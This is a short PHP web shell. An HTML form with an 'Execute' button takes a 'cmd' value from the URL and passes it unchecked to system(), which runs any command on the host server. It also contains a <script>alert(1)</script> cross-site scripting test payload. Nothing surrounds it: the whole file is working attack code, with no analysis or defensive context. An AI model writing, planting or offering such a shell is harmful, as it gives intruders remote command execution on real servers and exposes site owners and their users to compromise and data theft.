<html><body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form><pre>
<?php
    if(isset($_GET['cmd']))
    {
        $r = system($_GET['cmd']);
    }
    echo "Hi";
?>
<script>alert(1);</script>
</pre></body></html>
